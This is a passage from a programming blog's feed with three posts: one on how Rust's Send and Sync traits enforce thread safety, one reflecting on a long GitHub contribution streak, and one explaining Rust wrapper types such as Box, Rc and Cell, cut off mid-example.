and <a href="http://doc.rust-lang.org/std/marker/trait.Sync.html"><code>Sync</code></a>. I recommend reading that post if you&rsquo;re not familiar with Rust wrapper types
like <a href="https://doc.rust-lang.org/std/cell/struct.RefCell.html"><code>RefCell</code></a> and <a href="https://doc.rust-lang.org/std/rc/struct.Rc.html"><code>Rc</code></a>, since I&rsquo;ll be using them as examples throughout this post;
but the concepts explained here are largely independent.</p>

<p>For the purposes of this post, I&rsquo;ll restrict thread safety to mean no data races or cross-thread
dangling pointers. Rust doesn&rsquo;t aim to solve race conditions. However, there are projects which
utilize the type system to provide some form of extra safety, for example <a href="https://github.com/Munksgaard/rust-sessions">rust-
sessions</a> attempts to provide protocol safety using
session types.</p>

<p>These traits are auto-implemented using a feature called &ldquo;opt in builtin traits&rdquo;. So, for example,
if struct <code>Foo</code> contains only <a href="http://doc.rust-lang.org/std/marker/trait.Sync.html"><code>Sync</code></a> fields, it will also be <a href="http://doc.rust-lang.org/std/marker/trait.Sync.html"><code>Sync</code></a>, unless we
explicitly opt out using <code>impl !Sync for Foo {}</code>. Similarly, if struct <code>Foo</code> contains at least one
non-<a href="http://doc.rust-lang.org/std/marker/trait.Sync.html"><code>Sync</code></a> type, it will not be <a href="http://doc.rust-lang.org/std/marker/trait.Sync.html"><code>Sync</code></a> either, unless it explicitly opts in (<code>unsafe
impl Sync for Foo {}</code>)</p>

<p>This means that, for example, a <a href="http://doc.rust-lang.org/std/sync/mpsc/struct.Sender.html"><code>Sender</code></a> for a <a href="http://doc.rust-lang.org/std/marker/trait.Send.html"><code>Send</code></a> type is itself
<a href="http://doc.rust-lang.org/std/marker/trait.Send.html"><code>Send</code></a>, but a <a href="http://doc.rust-lang.org/std/sync/mpsc/struct.Sender.html"><code>Sender</code></a> for a non-<code>Send</code> type will not be <a href="http://doc.rust-lang.org/std/marker/trait.Send.html"><code>Send</code></a>. This
pattern is quite powerful; it lets one use channels with non-threadsafe data in a single-threaded
context without requiring a separate &ldquo;single threaded&rdquo; channel abstraction.</p>

<p>At the same time, structs like <a href="https://doc.rust-lang.org/std/rc/struct.Rc.html"><code>Rc</code></a> and <a href="https://doc.rust-lang.org/std/cell/struct.RefCell.html"><code>RefCell</code></a> which contain
<a href="http://doc.rust-lang.org/std/marker/trait.Send.html"><code>Send</code></a>/<a href="http://doc.rust-lang.org/std/marker/trait.Sync.html"><code>Sync</code></a> fields have explicitly opted out of one or more of these because the
invariants they rely on do not hold in threaded situations.</p>

<p>It&rsquo;s actually possible to design your own library with comparable thread safety guarantees outside
of the compiler &mdash; while these marker traits are specially treated by the compiler, the special
treatment is not necessary for their working. Any two opt-in builtin traits could be used here.</p>

<p><a href="http://doc.rust-lang.org/std/marker/trait.Send.html"><code>Send</code></a> and <a href="http://doc.rust-lang.org/std/marker/trait.Sync.html"><code>Sync</code></a> have slightly differing meanings, but are very intertwined.</p>

<p><a href="http://doc.rust-lang.org/std/marker/trait.Send.html"><code>Send</code></a> types can be moved between threads without an issue. It answers the question
&ldquo;if this variable were moved to another thread, would it still be valid for use?&rdquo;.
Most objects which completely own their contained data qualify here. Notably, <a href="https://doc.rust-lang.org/std/rc/struct.Rc.html"><code>Rc</code></a> doesn&rsquo;t
(since it is shared ownership). Another exception is <a href="https://doc.rust-lang.org/nightly/std/thread/struct.LocalKey.html"><code>LocalKey</code></a>, which
<em>does</em> own its data but isn&rsquo;t valid from other threads. Borrowed data does qualify to be <code>Send</code>, but
in most cases it can&rsquo;t be sent across threads due to a constraint that will be touched upon later.</p>

<p>Even though types like <a href="https://doc.rust-lang.org/std/cell/struct.RefCell.html"><code>RefCell</code></a> use non-atomic reference counting, it can be sent safely
between threads because this is a transfer of <em>ownership</em> (a move). Sending a <a href="https://doc.rust-lang.org/std/cell/struct.RefCell.html"><code>RefCell</code></a> to another thread
will be a move and will make it unusable from the original thread; so this is fine.</p>

<p><a href="http://doc.rust-lang.org/std/marker/trait.Sync.html"><code>Sync</code></a>, on the other hand, is about synchronous access. It answers the question: &ldquo;if
multiple threads were all trying to access this data, would it be safe?&rdquo;. Types like
<a href="http://doc.rust-lang.org/std/sync/struct.Mutex.html"><code>Mutex</code></a> and other lock/atomic based types implement this, along with primitive types.
Things containing pointers generally are not <a href="http://doc.rust-lang.org/std/marker/trait.Sync.html"><code>Sync</code></a>.</p>

<p><code>Sync</code> is sort of a crutch to <code>Send</code>; it helps make other types <a href="http://doc.rust-lang.org/std/marker/trait.Send.html"><code>Send</code></a> when sharing is
involved. For example, <code>&amp;T</code> and <a href="https://doc.rust-lang.org/std/sync/struct.Arc.html"><code>Arc&lt;T&gt;</code></a> are only <a href="http://doc.rust-lang.org/std/marker/trait.Send.html"><code>Send</code></a> when the inner data is <a href="http://doc.rust-lang.org/std/marker/trait.Sync.html"><code>Sync</code></a> (there&rsquo;s an additional
<a href="http://doc.rust-lang.org/std/marker/trait.Send.html"><code>Send</code></a> bound in the case of <a href="https://doc.rust-lang.org/std/sync/struct.Arc.html"><code>Arc&lt;T&gt;</code></a>). In words, stuff that has shared/borrowed ownership can be sent
to another thread if the shared/borrowed data is synchronous-safe.</p>

<p><a href="https://doc.rust-lang.org/std/cell/struct.RefCell.html"><code>RefCell</code></a>, while <a href="http://doc.rust-lang.org/std/marker/trait.Send.html"><code>Send</code></a>, is not <a href="http://doc.rust-lang.org/std/marker/trait.Sync.html"><code>Sync</code></a> because of the non atomic reference counting.</p>

<p>Bringing it together, the gatekeeper for all this is <a href="http://doc.rust-lang.org/std/thread/fn.spawn.html"><code>thread::spawn()</code></a>. It has the signature</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="k">pub</span> <span class="k">fn</span> <span class="nb">spawn</span><span class="o">&lt;</span><span class="n">F</span><span class="p">,</span> <span class="n">T</span><span class="o">&gt;</span><span class="p">(</span><span class="n">f</span><span class="o">:</span> <span class="n">F</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">JoinHandle</span><span class="o">&lt;</span><span class="n">T</span><span class="o">&gt;</span> <span class="n">where</span> <span class="n">F</span><span class="o">:</span> <span class="n">FnOnce</span><span class="p">()</span> <span class="o">-&gt;</span> <span class="n">T</span><span class="p">,</span> <span class="n">F</span><span class="o">:</span> <span class="nb">Send</span> <span class="o">+</span> <span class="k">&#39;static</span><span class="p">,</span> <span class="n">T</span><span class="o">:</span> <span class="nb">Send</span> <span class="o">+</span> <span class="k">&#39;static</span>
</span></code></pre></td></tr></table></div></figure>


<p>Admittedly, this is confusing/noisy, partially because it&rsquo;s allowed to return a value, and also because
it returns a handle from which we can block on a thread join. We can conjure a simpler <code>spawn</code> API for our needs though:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="k">pub</span> <span class="k">fn</span> <span class="nb">spawn</span><span class="o">&lt;</span><span class="n">F</span><span class="o">&gt;</span><span class="p">(</span><span class="n">f</span><span class="o">:</span> <span class="n">F</span><span class="p">)</span> <span class="n">where</span> <span class="n">F</span><span class="o">:</span> <span class="n">FnOnce</span><span class="p">(),</span> <span class="n">F</span><span class="o">:</span> <span class="nb">Send</span> <span class="o">+</span> <span class="k">&#39;static</span>
</span></code></pre></td></tr></table></div></figure>


<p>which can be called like:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="kd">let</span> <span class="k">mut</span> <span class="n">x</span> <span class="o">=</span> <span class="n">vec</span><span class="o">!</span><span class="p">[</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// `move` instructs the closure to move out of its environment</span>
</span><span class='line'><span class="n">thread</span><span class="o">::</span><span class="nb">spawn</span><span class="p">(</span><span class="n">move</span> <span class="o">||</span> <span class="p">{</span>
</span><span class='line'>   <span class="n">x</span><span class="p">.</span><span class="n">push</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'><span class="p">});</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// x is not accessible here since it was moved</span>
</span></code></pre></td></tr></table></div></figure>


<p>In words, <code>spawn()</code> will take a callable (usually a closure) that will be called once, and contains
data which is <a href="http://doc.rust-lang.org/std/marker/trait.Send.html"><code>Send</code></a> and <code>'static</code>. Here, <code>'static</code> just means that there is no borrowed
data contained in the closure. This is the aforementioned constraint that prevents the sharing of
borrowed data across threads; without it we would be able to send a borrowed pointer to a thread that
could easily outlive the borrow, causing safety issues.</p>

<p>There&rsquo;s a slight nuance here about the closures &mdash; closures can capture outer variables,
but by default they do so by-reference (hence the <code>move</code> keyword). They autoimplement <code>Send</code>
and <a href="http://doc.rust-lang.org/std/marker/trait.Sync.html"><code>Sync</code></a> depending on their capture clauses. For more on their internal representation,
see <a href="http://huonw.github.io/blog/2015/05/finding-closure-in-rust/">huon&rsquo;s post</a>. In this case, <code>x</code> was captured by-move; i.e. as <a href="https://doc.rust-lang.org/std/vec/struct.Vec.html"><code>Vec&lt;T&gt;</code></a>
(instead of being similar to <code>&amp;Vec&lt;T&gt;</code> or something), so the closure itself can be <code>Send</code>.
Without the <code>move</code> keyword, the closure would not be `&lsquo;static&rsquo; since it contains borrowed
content.</p>

<p>Since the closure inherits the <code>Send</code>/<code>Sync</code>/<code>'static</code>-ness of its captured data, a closure
capturing data of the correct type will satisfy the <code>F: Send+'static</code> bound.</p>

<p>Some examples of things that are allowed and not allowed by this function (for the type of <code>x</code>):</p>

<ul>
<li><a href="https://doc.rust-lang.org/std/vec/struct.Vec.html"><code>Vec&lt;T&gt;</code></a>, <a href="http://doc.rust-lang.org/std/boxed/struct.Box.html"><code>Box&lt;T&gt;</code></a> are allowed because they are <a href="http://doc.rust-lang.org/std/marker/trait.Send.html"><code>Send</code></a> and <code>'static</code> (when the inner type is of the same kind)</li>
<li><code>&amp;T</code> isn&rsquo;t allowed because it&rsquo;s not <code>'static</code>. This is good, because borrows should have a statically-known lifetime. Sending a borrowed pointer to a thread may lead to a use after free, or otherwise break aliasing rules.</li>
<li><a href="https://doc.rust-lang.org/std/rc/struct.Rc.html"><code>Rc&lt;T&gt;</code></a> isn&rsquo;t <a href="http://doc.rust-lang.org/std/marker/trait.Send.html"><code>Send</code></a>, so it isn&rsquo;t allowed. We could have some other <a href="https://doc.rust-lang.org/std/rc/struct.Rc.html"><code>Rc&lt;T&gt;</code></a>s hanging around, and end up with a data race on the refcount.</li>
<li><code>Arc&lt;Vec&lt;u32&gt;&gt;</code> is allowed (<a href="https://doc.rust-lang.org/std/vec/struct.Vec.html"><code>Vec&lt;T&gt;</code></a> is <a href="http://doc.rust-lang.org/std/marker/trait.Send.html"><code>Send</code></a> and <a href="http://doc.rust-lang.org/std/marker/trait.Sync.html"><code>Sync</code></a> if the inner type is); we can&rsquo;t cause a safety violation here. Iterator invalidation requires mutation, and <a href="https://doc.rust-lang.org/std/sync/struct.Arc.html"><code>Arc&lt;T&gt;</code></a> doesn&rsquo;t provide this by default.</li>
<li><code>Arc&lt;Cell&lt;T&gt;&gt;</code> isn&rsquo;t allowed. <a href="https://doc.rust-lang.org/std/cell/struct.Cell.html"><code>Cell&lt;T&gt;</code></a> provides copying-based internal mutability, and isn&rsquo;t <a href="http://doc.rust-lang.org/std/marker/trait.Sync.html"><code>Sync</code></a> (so the <code>Arc&lt;Cell&lt;T&gt;&gt;</code> isn&rsquo;t <a href="http://doc.rust-lang.org/std/marker/trait.Send.html"><code>Send</code></a>). If this were allowed, we could have cases where larger structs are getting written to from different threads simultaneously resulting in some random mishmash of the two. In other words, a data race.</li>
<li><code>Arc&lt;Mutex&lt;T&gt;&gt;</code> or <code>Arc&lt;RwLock&lt;T&gt;&gt;</code> are allowed (for <code>Send</code> <code>T</code>). The inner types use threadsafe locks and provide lock-based internal mutability. They can guarantee that only one thread is writing to them at any point in time. For this reason, the mutexes are <a href="http://doc.rust-lang.org/std/marker/trait.Sync.html"><code>Sync</code></a> regardless of the inner <code>T</code> (as long as it is <code>Send</code>), and <a href="http://doc.rust-lang.org/std/marker/trait.Sync.html"><code>Sync</code></a> types can be shared safely with wrappers like <a href="https://doc.rust-lang.org/std/sync/struct.Arc.html"><code>Arc</code></a>. From the point of view of the inner type, it&rsquo;s only being accessed by one thread at a time (slightly more complex in the case of <a href="http://doc.rust-lang.org/std/sync/struct.RwLock.html"><code>RwLock</code></a>), so it doesn&rsquo;t need to know about the threads involved. There can&rsquo;t be data races when <code>Sync</code> types like these are involved.</li>
</ul>


<p>As mentioned before, you can in fact create a <a href="http://doc.rust-lang.org/std/sync/mpsc/struct.Sender.html"><code>Sender</code></a>/<a href="http://doc.rust-lang.org/std/sync/mpsc/struct.Receiver.html"><code>Receiver</code></a> pair of non-<code>Send</code> objects. This sounds a bit
counterintuitive &mdash; shouldn&rsquo;t we be only sending values which are <code>Send</code>? However, <a href="http://doc.rust-lang.org/std/sync/mpsc/struct.Sender.html"><code>Sender&lt;T&gt;</code></a> is only
<code>Send</code> if <code>T</code> is <code>Send</code>; so even if we can use a <a href="http://doc.rust-lang.org/std/sync/mpsc/struct.Sender.html"><code>Sender</code></a> of a non-<code>Send</code> type, we cannot send it to another thread,
so it cannot be used to violate thread safety.</p>

<p>There is also a way to utilize the <code>Send</code>-ness of <code>&amp;T</code> (which is not <code>'static</code>) for some <a href="http://doc.rust-lang.org/std/marker/trait.Sync.html"><code>Sync</code></a> <code>T</code>, namely <a href="http://doc.rust-lang.org/std/thread/fn.scoped.html"><code>thread::scoped</code></a>.
This function does not have the <code>'static</code> bound, but it instead has an RAII guard which forces a join before the borrow ends. This
allows for easy fork-join parallelism without necessarily needing a <a href="http://doc.rust-lang.org/std/sync/struct.Mutex.html"><code>Mutex</code></a>.
Sadly, there <a href="http://cglab.ca/~abeinges/blah/everyone-peaches/">are</a> <a href="http://smallcultfollowing.com/babysteps/blog/2015/04/29/on-reference-counting-and-leaks/">problems</a> which crop up when this interacts with <a href="https://doc.rust-lang.org/std/rc/struct.Rc.html"><code>Rc</code></a> cycles, so the API
is currently unstable and will be redesigned. This is not a problem with the language design or the design of <code>Send</code>/<code>Sync</code>,
rather it is a perfect storm of small design inconsistencies in the libraries.</p>

<p><small>Discuss: <a href="https://news.ycombinator.com/item?id=9628131">HN</a>, <a href="https://www.reddit.com/r/rust/comments/37s5x2/how_rust_achieves_thread_safety/">Reddit</a></small></p>
<div class="footnotes">
<hr/>
<ol>
<li id="fn:1">
<p>So much that I added bonus slides about thread safety to the end of my deck, and of course I ended up using them at the talk I gave recently<a href="#fnref:1" rev="footnote">&#8617;</a></p></li>
</ol>
</div>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Github Streak: End-game and Post-mortem]]></title>
    <link href="http://manishearth.github.io/blog/2015/05/28/github-streak-end-game-and-post-mortem/"/>
    <updated>2015-05-28T08:48:53-07:00</updated>
    <id>http://manishearth.github.io/blog/2015/05/28/github-streak-end-game-and-post-mortem</id>
    <content type="html"><![CDATA[<p>More than a <a href="http://inpursuitoflaziness.blogspot.in/2014/02/50-shades-of-green.html">year ago</a> I blogged (and <a href="http://inpursuitoflaziness.blogspot.in/2014/04/50-more-shades-of-green.html">blogged again</a> later) about my
<a href="https://github.com/Manishearth">ongoing github streak</a>.</p>

<p>The GitHub streak has since gone on for more than 500 days<sup id="fnref:1"><a href="#fn:1" rel="footnote">1</a></sup>, and has been a really enriching experience.</p>

<p>Yesterday; I noticed something. I had reached end-game with this exercise. The streak is something I don&rsquo;t think about anymore,
and I don&rsquo;t make any efforts to keep it going. It just &hellip; happens. My involvement in open source has reached a level where
I don&rsquo;t need to consciously try contributing daily; I have enough interests/responsibilities that the streak is a side effect. This is despite
my current internship being at a place where the code I&rsquo;m working on is not hosted on GitHub (unlike last year). If the streak breaks, I won&rsquo;t
particularly care; and I <em>haven&rsquo;t</em> been caring for a while now.</p>

<p>&hellip; I think that&rsquo;s amazing. Despite me not realizing it at the time, this is the state of affairs that such an exercise would ideally
lead to &mdash; the initial motivation for the exercise replaced with something more substantial, until the excercise is no longer relevant.</p>

<p>I initially started this off after realizing that I had inadvertantly been contributing daily to open source for a week or so. In the past, my
contributions to open source used to be in bursts, which meant that I would be out of touch at times. I decided to try and work on extending this.
After around 30 days, I had a concrete habit. After around 40, I realized that I&rsquo;d become much more efficient at working on random bugs (even in unfamiliar codebases),
thus being able to spend more time writing real code.</p>

<p>Initially I had set a bunch of rules (listed in my <a href="http://inpursuitoflaziness.blogspot.in/2014/02/50-shades-of-green.html">original post</a>), which had stuff like issues/readme edits not counting (and no date manipulation!). I tweaked the rules around the 80-mark
to include issues/readmes when I had written code that day but it was lost in a commit squash or rebase. I think much later I dropped the rules about issues and readme edits entirely;
just considering &ldquo;anything that shows up on the punchcard which is not a result of date manipulation&rdquo; to be valid. At that point I was already quite involved in multiple projects
and didn&rsquo;t care so much about the streak or the original rules &mdash; it was just a habit at that point.</p>

<p>Now, I&rsquo;m a regular contributor to both the <a href="https://github.com/servo/servo">Servo</a> and <a href="https://github.com/rust-lang/rust">Rust</a> projects. I also have a bunch of personal projects (<a href="https://github.com/Manishearth/rust-clippy">some</a> <a href="https://github.com/Manishearth/rust-tenacious">lints</a> <a href="https://github.com/Manishearth/rust-extensible">and</a> <a href="https://github.com/Manishearth/rust-adorn">syntax extensions</a> for Rust, as well as a <a href="https://github.com/Manishearth/rust-gc/">gc</a>, along with a lot of older projects that I don&rsquo;t actively work on but maintain) and am trying to regularly blog. I&rsquo;ve
also gotten well into the habit of sending pull requests for fixing mistakes or annoyances. When all this comes together, I end up with at least one contribution a day. Sometimes more.
I have tons of things queued that I want to work on (both personal and as a part of Servo/Rust/elsewhere), if only I had the time.</p>

<p>If you do have enough spare time, I do recommend trying this. Once you get enough momentum the power of habit will keep it going, and if
my case is anything of an indicator<sup id="fnref:2"><a href="#fn:2" rel="footnote">2</a></sup> you&rsquo;ll eventually have a good chunk of contributions and some concrete open source involvement.</p>

<p>Please note that GitHub streaks shouldn&rsquo;t be used as a metric, <em>ever</em>. They&rsquo;re great for self motivation. As a metric for tracking employee performance,
or for filtering interview candidates; not so much. It&rsquo;s way too rough a metric (like LoC written), and oversimplifies the work that goes into code.
As far as using it to boost interview candidates; not everyone has the time or inclination to contribute to open source after a day job in programming,
and <em>that&rsquo;s okay</em>. I&rsquo;m a physics student &mdash; programming is like a hobby for me<sup id="fnref:3"><a href="#fn:3" rel="footnote">3</a></sup> which I&rsquo;ll gladly do daily. Now that I have a programming intern,
I&rsquo;m pretty sure there will be days where I don&rsquo;t want to program further after leaving the office.</p>
<div class="footnotes">
<hr/>
<ol>
<li id="fn:1">
<p>The punchcard on GitHub only shows 400-something because the streak got retroactively broken by some deletion or rebase &mdash; at that point I didn&rsquo;t care enough to investigate<a href="#fnref:1" rev="footnote">&#8617;</a></p></li>
<li id="fn:2">
<p>It could equally be just a bunch of luck with meeting the right people and choosing the right projects<a href="#fnref:2" rev="footnote">&#8617;</a></p></li>
<li id="fn:3">
<p>Though now it&rsquo;s a serious hobby which is a possible career option<a href="#fnref:3" rev="footnote">&#8617;</a></p></li>
</ol>
</div>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Wrapper Types in Rust: Choosing Your Guarantees]]></title>
    <link href="http://manishearth.github.io/blog/2015/05/27/wrapper-types-in-rust-choosing-your-guarantees/"/>
    <updated>2015-05-27T21:29:59-07:00</updated>
    <id>http://manishearth.github.io/blog/2015/05/27/wrapper-types-in-rust-choosing-your-guarantees</id>
    <content type="html"><![CDATA[<p><em>This post is now <a href="http://doc.rust-lang.org/nightly/book/choosing-your-guarantees.html">a part of the official rust book</a></em></p>

<p>In my <a href="http://manishearth.github.io/blog/2015/05/17/the-problem-with-shared-mutability/">previous post</a> I talked a bit about why the RWlock pattern is important for
accessing data, which is why Rust enforces this pattern either at compile time or runtime
depending on the abstractions used.</p>

<p>It occurred to me that there are many such abstractions in Rust, each with their unique guarantees.
The programmer once again has the choice between runtime and compile time enforcement. It occurred
to me that this plethora of &ldquo;wrapper types&rdquo;<sup id="fnref:1"><a href="#fn:1" rel="footnote">1</a></sup> could be daunting to newcomers; in this post I intend
to give a thorough explanation of what some prominent ones do and when they should be used.</p>

<p>I&rsquo;m assuming the reader knows about <a href="http://doc.rust-lang.org/book/ownership.html">ownership</a> and <a href="http://doc.rust-lang.org/book/references-and-borrowing.html">borrowing</a> in Rust.
Nevertheless, I will attempt to keep the majority of this post accessible to those not yet familiar with these
concepts. Aside from the two links into the book above, <a href="http://blog.skylight.io/rust-means-never-having-to-close-a-socket/">these</a> <a href="http://arthurtw.github.io/2014/11/30/rust-borrow-lifetimes.html">two</a> blog posts cover
the topic in depth.</p>

<h1>Basic pointer types</h1>

<h2><code>Box&lt;T&gt;</code></h2>

<p><a href="http://doc.rust-lang.org/std/boxed/struct.Box.html"><code>Box&lt;T&gt;</code></a> is an &ldquo;owned pointer&rdquo; or a &ldquo;box&rdquo;. While it can hand out borrowed references to the data, it is the only
owner of the data. In particular, when something like the following occurs:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="kd">let</span> <span class="n">x</span> <span class="o">=</span> <span class="n">Box</span><span class="o">::</span><span class="n">new</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span><span class='line'><span class="kd">let</span> <span class="n">y</span> <span class="o">=</span> <span class="n">x</span><span class="p">;</span>
</span><span class='line'><span class="c1">// x no longer accessible here</span>
</span></code></pre></td></tr></table></div></figure>


<p>Here, the box was <em>moved</em> into <code>y</code>. As <code>x</code> no longer owns it,
the compiler will no longer allow the programmer to use <code>x</code> after this. A box
can similarly be moved <em>out</em> of a function by returning, and when a
box (one which hasn&rsquo;t been moved) goes out of scope, destructors are run, deallocating
the inner data.</p>

<p>This abstraction is a low cost abstraction for dynamic allocation. If you want
to allocate some memory on the heap and safely pass a pointer to that memory around, this
is ideal. Note that you will only be allowed to share borrowed references to this by
the regular borrowing rules, checked at compile time.</p>

<h4>Interlude: <code>Copy</code></h4>

<p>Move/ownership semantics are not special to <code>Box&lt;T&gt;</code>; it is a feature of all types which are not <code>Copy</code>.</p>

<p>A <code>Copy</code> type is one where all the data it logically encompasses (usually, owns) is part of its stack
representation<sup id="fnref:2"><a href="#fn:2" rel="footnote">2</a></sup>.
Most types containing pointers to other data are not <code>Copy</code>, since there is additional data
elsewhere, and simply copying the stack representation may accidentally share ownership of that data
in an unsafe manner.</p>

<p>Types like <code>Vec&lt;T&gt;</code> and <code>String</code> which also have data on the heap are also not <code>Copy</code>. Types
like the integer/boolean types are <code>Copy</code></p>

<p><code>&amp;T</code> and raw pointers <em>are</em> <code>Copy</code>. Even though they do point
to further data, they do not &ldquo;own&rdquo; that data. Whereas <code>Box&lt;T&gt;</code> can be thought of as
&ldquo;some data which happens to be dynamically allocated&rdquo;, <code>&amp;T</code> is thought of as &ldquo;a borrowing reference
to some data&rdquo;. Even though both are pointers, only the first is considered to be &ldquo;data&rdquo;. Hence,
a copy of the first should involve a copy of the data (which is not part of its stack representation),
but a copy of the second only needs a copy of the reference. <code>&amp;mut T</code> is not <code>Copy</code> because mutable aliases
cannot be shared, and <code>&amp;mut T</code> &ldquo;owns&rdquo; the data it points to somewhat since it can mutate.</p>

<p>Practically speaking, a type can be <code>Copy</code> if a copy of its stack representation doesn&rsquo;t violate
memory safety.</p>

<h2><code>&amp;T</code> and <code>&amp;mut T</code></h2>

<p>These are immutable and mutable references respectively. They follow the &ldquo;read-write lock&rdquo; pattern
described in my <a href="http://manishearth.github.io/blog/2015/05/17/the-problem-with-shared-mutability/">previous post</a>, such that one may either have only one mutable reference
to some data, or any number of immutable ones, but not both. This guarantee is enforced at compile time,
and has no visible cost at runtime. In most cases such pointers suffice for sharing cheap references between
sections of code.</p>

<p>These pointers cannot be copied in such a way that they outlive the lifetime associated with them.</p>

<h2><code>*const T</code> and <code>*mut T</code></h2>

<p>These are C-like raw pointers with no lifetime or ownership attached to them. They just point to some location
in memory with no other restrictions. The only guarantee that these provide is that they cannot be dereferenced
except in code marked <code>unsafe</code>.</p>

<p>These are useful when building safe, low cost abstractions like <code>Vec&lt;T&gt;</code>, but should be avoided in safe code.</p>

<h2><code>Rc&lt;T&gt;</code></h2>

<p>This is the first wrapper we will cover that has a runtime cost.</p>

<p><a href="http://doc.rust-lang.org/std/rc/struct.Rc.html"><code>Rc&lt;T&gt;</code></a> is a reference counted pointer. In other words, this lets us have multiple &ldquo;owning&rdquo; pointers
to the same data, and the data will be freed (destructors will be run) when all pointers are out of scope.</p>

<p>Internally, it contains a shared &ldquo;reference count&rdquo;, which is incremented each time the <code>Rc</code> is cloned, and decremented
each time one of the <code>Rc</code>s goes out of scope. The main responsibility of <code>Rc&lt;T&gt;</code> is to ensure that destructors are called
for shared data.</p>

<p>The internal data here is immutable, and if a cycle of references is created, the data will be leaked. If we want
data that doesn&rsquo;t leak when there are cycles, we need a <em>garbage collector</em>. I do not know of any existing GCs in Rust,
but <a href="http://github.com/Manishearth/rust-gc">I am working on one with Michael Layzell</a> and there&rsquo;s <a href="https://github.com/fitzgen/rajan-bacon-cc">another cycle collecting one</a> being written by Nick
Fitzgerald.</p>

<h4>Guarantees</h4>

<p>The main guarantee provided here is that the data will not be destroyed until all references to it are out of scope.</p>

<p>This should be used when you wish to dynamically allocate and share some data (read-only) between various portions
of your program, where it is not certain which portion will finish using the pointer last. It&rsquo;s a viable alternative
to <code>&amp;T</code> when <code>&amp;T</code> is either impossible to statically check for correctness, or creates extremely unergonomic code where
the programmer does not wish to spend the development cost of working with.</p>

<p>This pointer is <em>not</em> thread safe, and Rust will not let it be sent or shared with other threads. This lets
one avoid the cost of atomics in situations where they are unnecessary.</p>

<p>There is a sister smart pointer to this one, <code>Weak&lt;T&gt;</code>. This is a non-owning, but also non-borrowed, smart pointer.
It is also similar to <code>&amp;T</code>, but it is not restricted in lifetime &mdash; a <code>Weak&lt;T&gt;</code> can be held on to forever. However,
it is possible that an attempt to access the inner data may fail and return <code>None</code>, since this can outlive the owned
<code>Rc</code>s. This is useful for when one wants cyclic data structures and other things.</p>

<h4>Cost</h4>

<p>As far as memory goes, <code>Rc&lt;T&gt;</code> is a single allocation, though it will allocate two extra words as compared to
a regular <code>Box&lt;T&gt;</code> (for &ldquo;strong&rdquo; and &ldquo;weak&rdquo; refcounts).</p>

<p><code>Rc&lt;T&gt;</code> has the computational cost of incrementing/decrementing the refcount whenever it is cloned or goes out of
scope respectively. Note that a clone will not do a deep copy, rather it will simply increment the inner reference count
and return a copy of the <code>Rc&lt;T&gt;</code></p>

<h1>Cell types</h1>

<p>&ldquo;Cells&rdquo; provide interior mutability. In other words, they contain data which can be manipulated even
if the type cannot be obtained in a mutable form (for example, when it is behind an <code>&amp;</code>-ptr or <code>Rc&lt;T&gt;</code>).</p>

<p><a href="http://doc.rust-lang.org/doc/std/cell/">The documentation for the <code>cell</code> module has a pretty good explanation for these</a>.</p>

<p>These types are <em>generally</em> found in struct fields, but they may be found elsewhere too.</p>

<h2><code>Cell&lt;T&gt;</code></h2>

<p><a href="http://doc.rust-lang.org/doc/std/cell/struct.Cell.html"><code>Cell&lt;T&gt;</code></a> is a type that provides zero-cost interior mutability, but only for <code>Copy</code> types.
Since the compiler knows that all the data owned by the contained value is on the stack, there&rsquo;s
no worry of leaking any data behind references (or worse!) by simply replacing the data.</p>

<p>It is still possible to violate your own invariants using this wrapper, so be careful when
using it. If a field is wrapped in <code>Cell</code>, it&rsquo;s a nice indicator that the chunk of data is mutable
and may not stay the same between the time you first read it and when you intend to use it.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="kd">let</span> <span class="n">x</span> <span class="o">=</span> <span class="n">Cell</span><span class="o">::</span><span class="n">new</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span><span class='line'><span class="kd">let</span> <span class="n">y</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">x</span><span class="p">;</span>
</span><span class='line'><span class="kd">let</span> <span class="n">z</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">x</span><span class="p">;</span>
</span><span class='line'><span class="n">x</span><span class="p">.</span><span class="n">set</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
</span><span class='line'><span class="n">y</span><span class="p">.</span><span class="n">set</span><span class="p">(</span><span class="mi">3</span><span class="p">);</span>
</span><span class='line'><span class="n">z</span><span class="p">.</span><span class="n">set</span><span class="p">(</span><span class="mi">4</span><span class="p">);</span>
